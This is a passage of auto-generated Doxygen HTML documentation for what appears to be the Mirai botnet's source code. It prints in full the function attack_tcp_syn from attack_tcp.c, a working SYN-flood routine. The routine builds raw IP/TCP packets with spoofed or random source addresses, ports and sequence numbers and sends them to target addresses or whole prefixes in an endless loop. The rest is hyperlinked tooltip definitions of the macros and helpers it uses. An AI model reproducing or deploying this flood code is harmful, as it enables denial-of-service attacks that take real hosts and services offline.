<div class="ttc" id="loader_2src_2headers_2includes_8h_html_aa93f0eb578d23995850d61f7d61c55c1"><div class="ttname"><a href="loader_2src_2headers_2includes_8h.html#aa93f0eb578d23995850d61f7d61c55c1">FALSE</a></div><div class="ttdeci">#define FALSE</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2headers_2includes_8h_source.html#l00009">includes.h:9</a></div></div>
<div class="ttc" id="attack_8h_html_ab8471c4c3e703d3c9ee4e971c48ba5fb"><div class="ttname"><a href="attack_8h.html#ab8471c4c3e703d3c9ee4e971c48ba5fb">ATK_OPT_DPORT</a></div><div class="ttdeci">#define ATK_OPT_DPORT</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00053">attack.h:53</a></div></div>
<div class="ttc" id="attack_8h_html_aecb175215ca3d0ce5017cd8cedb7e0fe"><div class="ttname"><a href="attack_8h.html#aecb175215ca3d0ce5017cd8cedb7e0fe">ATK_OPT_IP_IDENT</a></div><div class="ttdeci">#define ATK_OPT_IP_IDENT</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00049">attack.h:49</a></div></div>
<div class="ttc" id="protocol_8h_html_ad1a572736a10ff6b282c5f43c4ea1ccf"><div class="ttname"><a href="protocol_8h.html#ad1a572736a10ff6b282c5f43c4ea1ccf">data_len</a></div><div class="ttdeci">uint16_t data_len</div><div class="ttdef"><b>Definition:</b> <a href="protocol_8h_source.html#l00483">protocol.h:483</a></div></div>
</div><!-- fragment -->
</div>
</div>
<a class="anchor" id="a5fa5ce92d7cd276d0cf13922eddf1e6d"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">void attack_tcp_syn </td>
          <td>(</td>
          <td class="paramtype">uint8_t&#160;</td>
          <td class="paramname">, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">struct <a class="el" href="structattack__target.html">attack_target</a> *&#160;</td>
          <td class="paramname">, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">uint8_t&#160;</td>
          <td class="paramname">, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">struct <a class="el" href="structattack__option.html">attack_option</a> *&#160;</td>
          <td class="paramname">&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack__tcp_8c_source.html#l00018">18</a> of file <a class="el" href="attack__tcp_8c_source.html">attack_tcp.c</a>.</p>

<p>References <a class="el" href="attack_8h_source.html#l00022">attack_target::addr</a>, <a class="el" href="attack_8h_source.html#l00058">ATK_OPT_ACK</a>, <a class="el" href="attack_8h_source.html#l00064">ATK_OPT_ACKRND</a>, <a class="el" href="attack_8h_source.html#l00053">ATK_OPT_DPORT</a>, <a class="el" href="attack_8h_source.html#l00062">ATK_OPT_FIN</a>, <a class="el" href="attack_8h_source.html#l00051">ATK_OPT_IP_DF</a>, <a class="el" href="attack_8h_source.html#l00049">ATK_OPT_IP_IDENT</a>, <a class="el" href="attack_8h_source.html#l00048">ATK_OPT_IP_TOS</a>, <a class="el" href="attack_8h_source.html#l00050">ATK_OPT_IP_TTL</a>, <a class="el" href="attack_8h_source.html#l00059">ATK_OPT_PSH</a>, <a class="el" href="attack_8h_source.html#l00060">ATK_OPT_RST</a>, <a class="el" href="attack_8h_source.html#l00063">ATK_OPT_SEQRND</a>, <a class="el" href="attack_8h_source.html#l00071">ATK_OPT_SOURCE</a>, <a class="el" href="attack_8h_source.html#l00052">ATK_OPT_SPORT</a>, <a class="el" href="attack_8h_source.html#l00061">ATK_OPT_SYN</a>, <a class="el" href="attack_8h_source.html#l00057">ATK_OPT_URG</a>, <a class="el" href="attack_8c_source.html#l00206">attack_get_opt_int()</a>, <a class="el" href="attack_8c_source.html#l00216">attack_get_opt_ip()</a>, <a class="el" href="checksum_8c_source.html#l00009">checksum_generic()</a>, <a class="el" href="checksum_8c_source.html#l00024">checksum_tcpudp()</a>, <a class="el" href="wget_8c_source.html#l00052">close</a>, <a class="el" href="loader_2src_2headers_2includes_8h_source.html#l00009">FALSE</a>, <a class="el" href="mirai_2bot_2includes_8h_source.html#l00031">LOCAL_ADDR</a>, <a class="el" href="protocol_8h_source.html#l00029">PROTO_TCP_OPT_MSS</a>, <a class="el" href="protocol_8h_source.html#l00031">PROTO_TCP_OPT_SACK</a>, <a class="el" href="protocol_8h_source.html#l00032">PROTO_TCP_OPT_TSVAL</a>, <a class="el" href="protocol_8h_source.html#l00030">PROTO_TCP_OPT_WSS</a>, <a class="el" href="rand_8c_source.html#l00021">rand_next()</a>, <a class="el" href="attack_8h_source.html#l00021">attack_target::sock_addr</a>, <a class="el" href="wget_8c_source.html#l00047">socket</a>, and <a class="el" href="loader_2src_2headers_2includes_8h_source.html#l00010">TRUE</a>.</p>

<p>Referenced by <a class="el" href="attack_8c_source.html#l00022">attack_init()</a>.</p>
<div class="fragment"><div class="line"><a name="l00019"></a><span class="lineno">   19</span>&#160;{</div><div class="line"><a name="l00020"></a><span class="lineno">   20</span>&#160;    <span class="keywordtype">int</span> i, fd;</div><div class="line"><a name="l00021"></a><span class="lineno">   21</span>&#160;    <span class="keywordtype">char</span> **pkts = calloc(targs_len, <span class="keyword">sizeof</span> (<span class="keywordtype">char</span> *));</div><div class="line"><a name="l00022"></a><span class="lineno">   22</span>&#160;    uint8_t ip_tos = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a1ac4210e00c74506c31642a74e3fc1c7">ATK_OPT_IP_TOS</a>, 0);</div><div class="line"><a name="l00023"></a><span class="lineno">   23</span>&#160;    uint16_t ip_ident = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#aecb175215ca3d0ce5017cd8cedb7e0fe">ATK_OPT_IP_IDENT</a>, 0xffff);</div><div class="line"><a name="l00024"></a><span class="lineno">   24</span>&#160;    uint8_t ip_ttl = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#acfa2ed8a557040aed04b6c9346aa0eb9">ATK_OPT_IP_TTL</a>, 64);</div><div class="line"><a name="l00025"></a><span class="lineno">   25</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a> dont_frag = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a57162ecbd3f7644a8f6a6b58aa4f8596">ATK_OPT_IP_DF</a>, <a class="code" href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a>);</div><div class="line"><a name="l00026"></a><span class="lineno">   26</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#adccb5337cf206fe3eca7c4732f634bb9">port_t</a> sport = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a4d0115976f56267c42e6a09ff3651c02">ATK_OPT_SPORT</a>, 0xffff);</div><div class="line"><a name="l00027"></a><span class="lineno">   27</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#adccb5337cf206fe3eca7c4732f634bb9">port_t</a> dport = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#ab8471c4c3e703d3c9ee4e971c48ba5fb">ATK_OPT_DPORT</a>, 0xffff);</div><div class="line"><a name="l00028"></a><span class="lineno">   28</span>&#160;    uint32_t seq = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a97b7c19adba8f5e25d603d4fcd80c995">ATK_OPT_SEQRND</a>, 0xffff);</div><div class="line"><a name="l00029"></a><span class="lineno">   29</span>&#160;    uint32_t ack = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a0fcd18d4c1705cc62b8a2d3f92e0a780">ATK_OPT_ACKRND</a>, 0);</div><div class="line"><a name="l00030"></a><span class="lineno">   30</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a> urg_fl = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a5a6f282c43f088516dce2de1b69ae7d8">ATK_OPT_URG</a>, <a class="code" href="loader_2src_2headers_2includes_8h.html#aa93f0eb578d23995850d61f7d61c55c1">FALSE</a>);</div><div class="line"><a name="l00031"></a><span class="lineno">   31</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a> ack_fl = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a61c202b303f42c57328c999b1104877d">ATK_OPT_ACK</a>, <a class="code" href="loader_2src_2headers_2includes_8h.html#aa93f0eb578d23995850d61f7d61c55c1">FALSE</a>);</div><div class="line"><a name="l00032"></a><span class="lineno">   32</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a> psh_fl = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a5ae76926414352bb8e12896c5581a0fd">ATK_OPT_PSH</a>, <a class="code" href="loader_2src_2headers_2includes_8h.html#aa93f0eb578d23995850d61f7d61c55c1">FALSE</a>);</div><div class="line"><a name="l00033"></a><span class="lineno">   33</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a> rst_fl = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a4464ea34ef73875f57b5c6a412aaac20">ATK_OPT_RST</a>, <a class="code" href="loader_2src_2headers_2includes_8h.html#aa93f0eb578d23995850d61f7d61c55c1">FALSE</a>);</div><div class="line"><a name="l00034"></a><span class="lineno">   34</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a> syn_fl = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a4f086d53d4494633a898fbd9886b08bf">ATK_OPT_SYN</a>, <a class="code" href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a>);</div><div class="line"><a name="l00035"></a><span class="lineno">   35</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a> fin_fl = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a2ad2949e3a473ebba047e474abf5d461">ATK_OPT_FIN</a>, <a class="code" href="loader_2src_2headers_2includes_8h.html#aa93f0eb578d23995850d61f7d61c55c1">FALSE</a>);</div><div class="line"><a name="l00036"></a><span class="lineno">   36</span>&#160;    uint32_t source_ip = <a class="code" href="attack_8c.html#a51262dda96f2861dbd13fc0b6f0a31d3">attack_get_opt_ip</a>(opts_len, opts, <a class="code" href="attack_8h.html#a9b14feb6720fefac0c6da63a77da718e">ATK_OPT_SOURCE</a>, <a class="code" href="mirai_2bot_2includes_8h.html#aecb64c7238a325af454cf5e17d933ff2">LOCAL_ADDR</a>);</div><div class="line"><a name="l00037"></a><span class="lineno">   37</span>&#160;</div><div class="line"><a name="l00038"></a><span class="lineno">   38</span>&#160;    <span class="keywordflow">if</span> ((fd = <a class="code" href="wget_8c.html#aa8318fbee111c5bde5952c63e894c962">socket</a>(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)</div><div class="line"><a name="l00039"></a><span class="lineno">   39</span>&#160;    {</div><div class="line"><a name="l00040"></a><span class="lineno">   40</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00041"></a><span class="lineno">   41</span>&#160;        printf(<span class="stringliteral">&quot;Failed to create raw socket. Aborting attack\n&quot;</span>);</div><div class="line"><a name="l00042"></a><span class="lineno">   42</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00043"></a><span class="lineno">   43</span>&#160;        <span class="keywordflow">return</span>;</div><div class="line"><a name="l00044"></a><span class="lineno">   44</span>&#160;    }</div><div class="line"><a name="l00045"></a><span class="lineno">   45</span>&#160;    </div><div class="line"><a name="l00046"></a><span class="lineno">   46</span>&#160;    i = 1;</div><div class="line"><a name="l00047"></a><span class="lineno">   47</span>&#160;    <span class="keywordflow">if</span> (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &amp;i, <span class="keyword">sizeof</span> (<span class="keywordtype">int</span>)) == -1)</div><div class="line"><a name="l00048"></a><span class="lineno">   48</span>&#160;    {</div><div class="line"><a name="l00049"></a><span class="lineno">   49</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00050"></a><span class="lineno">   50</span>&#160;        printf(<span class="stringliteral">&quot;Failed to set IP_HDRINCL. Aborting\n&quot;</span>);</div><div class="line"><a name="l00051"></a><span class="lineno">   51</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00052"></a><span class="lineno">   52</span>&#160;        <a class="code" href="wget_8c.html#a9c7f6d5331abb2692a876d5ee67474b7">close</a>(fd);</div><div class="line"><a name="l00053"></a><span class="lineno">   53</span>&#160;        <span class="keywordflow">return</span>;</div><div class="line"><a name="l00054"></a><span class="lineno">   54</span>&#160;    }</div><div class="line"><a name="l00055"></a><span class="lineno">   55</span>&#160;</div><div class="line"><a name="l00056"></a><span class="lineno">   56</span>&#160;    <span class="keywordflow">for</span> (i = 0; i &lt; targs_len; i++)</div><div class="line"><a name="l00057"></a><span class="lineno">   57</span>&#160;    {</div><div class="line"><a name="l00058"></a><span class="lineno">   58</span>&#160;        <span class="keyword">struct </span>iphdr *iph;</div><div class="line"><a name="l00059"></a><span class="lineno">   59</span>&#160;        <span class="keyword">struct </span>tcphdr *tcph;</div><div class="line"><a name="l00060"></a><span class="lineno">   60</span>&#160;        uint8_t *opts;</div><div class="line"><a name="l00061"></a><span class="lineno">   61</span>&#160;</div><div class="line"><a name="l00062"></a><span class="lineno">   62</span>&#160;        pkts[i] = calloc(128, <span class="keyword">sizeof</span> (<span class="keywordtype">char</span>));</div><div class="line"><a name="l00063"></a><span class="lineno">   63</span>&#160;        iph = (<span class="keyword">struct </span>iphdr *)pkts[i];</div><div class="line"><a name="l00064"></a><span class="lineno">   64</span>&#160;        tcph = (<span class="keyword">struct </span>tcphdr *)(iph + 1);</div><div class="line"><a name="l00065"></a><span class="lineno">   65</span>&#160;        opts = (uint8_t *)(tcph + 1);</div><div class="line"><a name="l00066"></a><span class="lineno">   66</span>&#160;</div><div class="line"><a name="l00067"></a><span class="lineno">   67</span>&#160;        iph-&gt;version = 4;</div><div class="line"><a name="l00068"></a><span class="lineno">   68</span>&#160;        iph-&gt;ihl = 5;</div><div class="line"><a name="l00069"></a><span class="lineno">   69</span>&#160;        iph-&gt;tos = ip_tos;</div><div class="line"><a name="l00070"></a><span class="lineno">   70</span>&#160;        iph-&gt;tot_len = htons(<span class="keyword">sizeof</span> (<span class="keyword">struct</span> iphdr) + <span class="keyword">sizeof</span> (<span class="keyword">struct</span> tcphdr) + 20);</div><div class="line"><a name="l00071"></a><span class="lineno">   71</span>&#160;        iph-&gt;id = htons(ip_ident);</div><div class="line"><a name="l00072"></a><span class="lineno">   72</span>&#160;        iph-&gt;ttl = ip_ttl;</div><div class="line"><a name="l00073"></a><span class="lineno">   73</span>&#160;        <span class="keywordflow">if</span> (dont_frag)</div><div class="line"><a name="l00074"></a><span class="lineno">   74</span>&#160;            iph-&gt;frag_off = htons(1 &lt;&lt; 14);</div><div class="line"><a name="l00075"></a><span class="lineno">   75</span>&#160;        iph-&gt;protocol = IPPROTO_TCP;</div><div class="line"><a name="l00076"></a><span class="lineno">   76</span>&#160;        iph-&gt;saddr = source_ip;</div><div class="line"><a name="l00077"></a><span class="lineno">   77</span>&#160;        iph-&gt;daddr = targs[i].addr;</div><div class="line"><a name="l00078"></a><span class="lineno">   78</span>&#160;</div><div class="line"><a name="l00079"></a><span class="lineno">   79</span>&#160;        tcph-&gt;source = htons(sport);</div><div class="line"><a name="l00080"></a><span class="lineno">   80</span>&#160;        tcph-&gt;dest = htons(dport);</div><div class="line"><a name="l00081"></a><span class="lineno">   81</span>&#160;        tcph-&gt;seq = htons(seq);</div><div class="line"><a name="l00082"></a><span class="lineno">   82</span>&#160;        tcph-&gt;doff = 10;</div><div class="line"><a name="l00083"></a><span class="lineno">   83</span>&#160;        tcph-&gt;urg = urg_fl;</div><div class="line"><a name="l00084"></a><span class="lineno">   84</span>&#160;        tcph-&gt;ack = ack_fl;</div><div class="line"><a name="l00085"></a><span class="lineno">   85</span>&#160;        tcph-&gt;psh = psh_fl;</div><div class="line"><a name="l00086"></a><span class="lineno">   86</span>&#160;        tcph-&gt;rst = rst_fl;</div><div class="line"><a name="l00087"></a><span class="lineno">   87</span>&#160;        tcph-&gt;syn = syn_fl;</div><div class="line"><a name="l00088"></a><span class="lineno">   88</span>&#160;        tcph-&gt;fin = fin_fl;</div><div class="line"><a name="l00089"></a><span class="lineno">   89</span>&#160;</div><div class="line"><a name="l00090"></a><span class="lineno">   90</span>&#160;        <span class="comment">// TCP MSS</span></div><div class="line"><a name="l00091"></a><span class="lineno">   91</span>&#160;        *opts++ = <a class="code" href="protocol_8h.html#a0ac41cedcfd51c915345550521966281">PROTO_TCP_OPT_MSS</a>;    <span class="comment">// Kind</span></div><div class="line"><a name="l00092"></a><span class="lineno">   92</span>&#160;        *opts++ = 4;                    <span class="comment">// Length</span></div><div class="line"><a name="l00093"></a><span class="lineno">   93</span>&#160;        *((uint16_t *)opts) = htons(1400 + (<a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>() &amp; 0x0f));</div><div class="line"><a name="l00094"></a><span class="lineno">   94</span>&#160;        opts += <span class="keyword">sizeof</span> (uint16_t);</div><div class="line"><a name="l00095"></a><span class="lineno">   95</span>&#160;</div><div class="line"><a name="l00096"></a><span class="lineno">   96</span>&#160;        <span class="comment">// TCP SACK permitted</span></div><div class="line"><a name="l00097"></a><span class="lineno">   97</span>&#160;        *opts++ = <a class="code" href="protocol_8h.html#a7685648be6843dc7a65440e8696044d1">PROTO_TCP_OPT_SACK</a>;</div><div class="line"><a name="l00098"></a><span class="lineno">   98</span>&#160;        *opts++ = 2;</div><div class="line"><a name="l00099"></a><span class="lineno">   99</span>&#160;</div><div class="line"><a name="l00100"></a><span class="lineno">  100</span>&#160;        <span class="comment">// TCP timestamps</span></div><div class="line"><a name="l00101"></a><span class="lineno">  101</span>&#160;        *opts++ = <a class="code" href="protocol_8h.html#a8922d59dda5c9af3f4d0dd3ac311846d">PROTO_TCP_OPT_TSVAL</a>;</div><div class="line"><a name="l00102"></a><span class="lineno">  102</span>&#160;        *opts++ = 10;</div><div class="line"><a name="l00103"></a><span class="lineno">  103</span>&#160;        *((uint32_t *)opts) = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>();</div><div class="line"><a name="l00104"></a><span class="lineno">  104</span>&#160;        opts += <span class="keyword">sizeof</span> (uint32_t);</div><div class="line"><a name="l00105"></a><span class="lineno">  105</span>&#160;        *((uint32_t *)opts) = 0;</div><div class="line"><a name="l00106"></a><span class="lineno">  106</span>&#160;        opts += <span class="keyword">sizeof</span> (uint32_t);</div><div class="line"><a name="l00107"></a><span class="lineno">  107</span>&#160;</div><div class="line"><a name="l00108"></a><span class="lineno">  108</span>&#160;        <span class="comment">// TCP nop</span></div><div class="line"><a name="l00109"></a><span class="lineno">  109</span>&#160;        *opts++ = 1;</div><div class="line"><a name="l00110"></a><span class="lineno">  110</span>&#160;</div><div class="line"><a name="l00111"></a><span class="lineno">  111</span>&#160;        <span class="comment">// TCP window scale</span></div><div class="line"><a name="l00112"></a><span class="lineno">  112</span>&#160;        *opts++ = <a class="code" href="protocol_8h.html#af4ea7ee9b6b8b13a589a2276719c1ea6">PROTO_TCP_OPT_WSS</a>;</div><div class="line"><a name="l00113"></a><span class="lineno">  113</span>&#160;        *opts++ = 3;</div><div class="line"><a name="l00114"></a><span class="lineno">  114</span>&#160;        *opts++ = 6; <span class="comment">// 2^6 = 64, window size scale = 64</span></div><div class="line"><a name="l00115"></a><span class="lineno">  115</span>&#160;    }</div><div class="line"><a name="l00116"></a><span class="lineno">  116</span>&#160;</div><div class="line"><a name="l00117"></a><span class="lineno">  117</span>&#160;    <span class="keywordflow">while</span> (<a class="code" href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a>)</div><div class="line"><a name="l00118"></a><span class="lineno">  118</span>&#160;    {</div><div class="line"><a name="l00119"></a><span class="lineno">  119</span>&#160;        <span class="keywordflow">for</span> (i = 0; i &lt; targs_len; i++)</div><div class="line"><a name="l00120"></a><span class="lineno">  120</span>&#160;        {</div><div class="line"><a name="l00121"></a><span class="lineno">  121</span>&#160;            <span class="keywordtype">char</span> *pkt = pkts[i];</div><div class="line"><a name="l00122"></a><span class="lineno">  122</span>&#160;            <span class="keyword">struct </span>iphdr *iph = (<span class="keyword">struct </span>iphdr *)pkt;</div><div class="line"><a name="l00123"></a><span class="lineno">  123</span>&#160;            <span class="keyword">struct </span>tcphdr *tcph = (<span class="keyword">struct </span>tcphdr *)(iph + 1);</div><div class="line"><a name="l00124"></a><span class="lineno">  124</span>&#160;            </div><div class="line"><a name="l00125"></a><span class="lineno">  125</span>&#160;            <span class="comment">// For prefix attacks</span></div><div class="line"><a name="l00126"></a><span class="lineno">  126</span>&#160;            <span class="keywordflow">if</span> (targs[i].netmask &lt; 32)</div><div class="line"><a name="l00127"></a><span class="lineno">  127</span>&#160;                iph-&gt;daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)<a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>()) &gt;&gt; targs[i].netmask));</div><div class="line"><a name="l00128"></a><span class="lineno">  128</span>&#160;</div><div class="line"><a name="l00129"></a><span class="lineno">  129</span>&#160;            <span class="keywordflow">if</span> (source_ip == 0xffffffff)</div><div class="line"><a name="l00130"></a><span class="lineno">  130</span>&#160;                iph-&gt;saddr = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>();</div><div class="line"><a name="l00131"></a><span class="lineno">  131</span>&#160;            <span class="keywordflow">if</span> (ip_ident == 0xffff)</div><div class="line"><a name="l00132"></a><span class="lineno">  132</span>&#160;                iph-&gt;id = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>() &amp; 0xffff;</div><div class="line"><a name="l00133"></a><span class="lineno">  133</span>&#160;            <span class="keywordflow">if</span> (sport == 0xffff)</div><div class="line"><a name="l00134"></a><span class="lineno">  134</span>&#160;                tcph-&gt;source = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>() &amp; 0xffff;</div><div class="line"><a name="l00135"></a><span class="lineno">  135</span>&#160;            <span class="keywordflow">if</span> (dport == 0xffff)</div><div class="line"><a name="l00136"></a><span class="lineno">  136</span>&#160;                tcph-&gt;dest = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>() &amp; 0xffff;</div><div class="line"><a name="l00137"></a><span class="lineno">  137</span>&#160;            <span class="keywordflow">if</span> (seq == 0xffff)</div><div class="line"><a name="l00138"></a><span class="lineno">  138</span>&#160;                tcph-&gt;seq = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>();</div><div class="line"><a name="l00139"></a><span class="lineno">  139</span>&#160;            <span class="keywordflow">if</span> (ack == 0xffff)</div><div class="line"><a name="l00140"></a><span class="lineno">  140</span>&#160;                tcph-&gt;ack_seq = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>();</div><div class="line"><a name="l00141"></a><span class="lineno">  141</span>&#160;            <span class="keywordflow">if</span> (urg_fl)</div><div class="line"><a name="l00142"></a><span class="lineno">  142</span>&#160;                tcph-&gt;urg_ptr = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>() &amp; 0xffff;</div><div class="line"><a name="l00143"></a><span class="lineno">  143</span>&#160;</div><div class="line"><a name="l00144"></a><span class="lineno">  144</span>&#160;            iph-&gt;check = 0;</div><div class="line"><a name="l00145"></a><span class="lineno">  145</span>&#160;            iph-&gt;check = <a class="code" href="checksum_8c.html#a84522f5e663ea711a5ceafdf03e586ea">checksum_generic</a>((uint16_t *)iph, <span class="keyword">sizeof</span> (<span class="keyword">struct</span> iphdr));</div><div class="line"><a name="l00146"></a><span class="lineno">  146</span>&#160;</div><div class="line"><a name="l00147"></a><span class="lineno">  147</span>&#160;            tcph-&gt;check = 0;</div><div class="line"><a name="l00148"></a><span class="lineno">  148</span>&#160;            tcph-&gt;check = <a class="code" href="checksum_8c.html#a5144ab59500e01ed196ae6d8b4584c98">checksum_tcpudp</a>(iph, tcph, htons(<span class="keyword">sizeof</span> (<span class="keyword">struct</span> tcphdr) + 20), <span class="keyword">sizeof</span> (<span class="keyword">struct</span> tcphdr) + 20);</div><div class="line"><a name="l00149"></a><span class="lineno">  149</span>&#160;</div><div class="line"><a name="l00150"></a><span class="lineno">  150</span>&#160;            targs[i].sock_addr.sin_port = tcph-&gt;dest;</div><div class="line"><a name="l00151"></a><span class="lineno">  151</span>&#160;            sendto(fd, pkt, <span class="keyword">sizeof</span> (<span class="keyword">struct</span> iphdr) + <span class="keyword">sizeof</span> (<span class="keyword">struct</span> tcphdr) + 20, MSG_NOSIGNAL, (<span class="keyword">struct</span> sockaddr *)&amp;targs[i].sock_addr, <span class="keyword">sizeof</span> (<span class="keyword">struct</span> sockaddr_in));</div><div class="line"><a name="l00152"></a><span class="lineno">  152</span>&#160;        }</div><div class="line"><a name="l00153"></a><span class="lineno">  153</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00154"></a><span class="lineno">  154</span>&#160;            <span class="keywordflow">break</span>;</div><div class="line"><a name="l00155"></a><span class="lineno">  155</span>&#160;            <span class="keywordflow">if</span> (errno != 0)</div><div class="line"><a name="l00156"></a><span class="lineno">  156</span>&#160;                printf(<span class="stringliteral">&quot;errno = %d\n&quot;</span>, errno);</div><div class="line"><a name="l00157"></a><span class="lineno">  157</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00158"></a><span class="lineno">  158</span>&#160;    }</div><div class="line"><a name="l00159"></a><span class="lineno">  159</span>&#160;}</div><div class="ttc" id="loader_2src_2headers_2includes_8h_html_adccb5337cf206fe3eca7c4732f634bb9"><div class="ttname"><a href="loader_2src_2headers_2includes_8h.html#adccb5337cf206fe3eca7c4732f634bb9">port_t</a></div><div class="ttdeci">uint16_t port_t</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2headers_2includes_8h_source.html#l00014">includes.h:14</a></div></div>
<div class="ttc" id="checksum_8c_html_a84522f5e663ea711a5ceafdf03e586ea"><div class="ttname"><a href="checksum_8c.html#a84522f5e663ea711a5ceafdf03e586ea">checksum_generic</a></div><div class="ttdeci">uint16_t checksum_generic(uint16_t *addr, uint32_t count)</div><div class="ttdef"><b>Definition:</b> <a href="checksum_8c_source.html#l00009">checksum.c:9</a></div></div>
<div class="ttc" id="attack_8h_html_a4f086d53d4494633a898fbd9886b08bf"><div class="ttname"><a href="attack_8h.html#a4f086d53d4494633a898fbd9886b08bf">ATK_OPT_SYN</a></div><div class="ttdeci">#define ATK_OPT_SYN</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00061">attack.h:61</a></div></div>
<div class="ttc" id="wget_8c_html_aa8318fbee111c5bde5952c63e894c962"><div class="ttname"><a href="wget_8c.html#aa8318fbee111c5bde5952c63e894c962">socket</a></div><div class="ttdeci">#define socket</div><div class="ttdef"><b>Definition:</b> <a href="wget_8c_source.html#l00047">wget.c:47</a></div></div>
<div class="ttc" id="wget_8c_html_a9c7f6d5331abb2692a876d5ee67474b7"><div class="ttname"><a href="wget_8c.html#a9c7f6d5331abb2692a876d5ee67474b7">close</a></div><div class="ttdeci">#define close</div><div class="ttdef"><b>Definition:</b> <a href="wget_8c_source.html#l00052">wget.c:52</a></div></div>
<div class="ttc" id="protocol_8h_html_a8922d59dda5c9af3f4d0dd3ac311846d"><div class="ttname"><a href="protocol_8h.html#a8922d59dda5c9af3f4d0dd3ac311846d">PROTO_TCP_OPT_TSVAL</a></div><div class="ttdeci">#define PROTO_TCP_OPT_TSVAL</div><div class="ttdef"><b>Definition:</b> <a href="protocol_8h_source.html#l00032">protocol.h:32</a></div></div>
